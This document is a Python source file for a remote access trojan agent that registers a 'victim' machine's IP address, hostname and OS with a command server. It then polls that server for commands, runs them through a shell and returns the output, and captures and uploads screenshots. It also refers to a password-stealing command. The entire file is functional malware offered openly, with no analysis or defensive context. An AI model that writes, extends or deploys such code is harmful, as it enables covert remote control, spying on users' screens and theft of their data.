import requests
import subprocess
import time
import uuid
import mss
import base64
import io
from PIL import Image
import platform
import threading

VICTIM_ID = str(uuid.getnode())
SERVER = "http://127.0.0.1:5000"

print(f"[*] Agent ID: {VICTIM_ID}")

def send_screenshot():
    try:
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
            buffer = io.BytesIO()
            img_rgb = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
            img_rgb.save(buffer, format="JPEG", quality=70)
            img_base64 = base64.b64encode(buffer.getvalue()).decode()
            
            r = requests.post(f"{SERVER}/api/upload_screenshot", 
                             json={"victim_id": VICTIM_ID, "image": img_base64, "source": "discord"}, 
                             timeout=30)
            print(f"[+] Screenshot sent: {r.status_code}")
            return True
    except Exception as e:
        print(f"[-] Screenshot error: {e}")
        return False

def register():
    try:
        ip = requests.get("https://api.ipify.org").text
        r = requests.post(f"{SERVER}/api/register", json={
            "victim_id": VICTIM_ID,
            "ip": ip,
            "hostname": platform.node(),
            "os_info": f"{platform.system()} {platform.release()}"
        }, timeout=10)
        print(f"[+] Registered: {r.status_code}")
        return True
    except Exception as e:
        print(f"[-] Register error: {e}")
        return False

def execute_command(cmd):
    try:
        if cmd.lower() == "screenshot":
            success = send_screenshot()
            return "[+] Screenshot captured" if success else "[-] Screenshot failed"
        elif cmd.lower() == "steal":
            return "[+] Password stealing completed (check web dashboard)"
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            if not output.strip():
                return "[+] Command executed (no output)"
            return output
    except subprocess.TimeoutExpired:
        return "[-] Command timeout"
    except Exception as e:
        return f"[-] Error: {e}"

def poll_commands():
    print("[*] Polling for commands...")
    while True:
        try:
            r = requests.get(f"{SERVER}/api/poll/{VICTIM_ID}", timeout=10)
            if r.status_code == 200:
                cmd = r.json().get("command")
                if cmd:
                    print(f"\n[!] Command: {cmd}")
                    result = execute_command(cmd)
                    print(f"[*] Result: {result[:200]}")
                    
                    requests.post(f"{SERVER}/api/result", json={
                        "victim_id": VICTIM_ID,
                        "command": cmd,
                        "result": result
                    }, timeout=10)
                    print(f"[+] Result sent")
        except Exception as e:
            pass
        time.sleep(3)

print("[*] Starting Agent...")
if register():
    poll_commands()
else:
    print("[-] Registration failed")
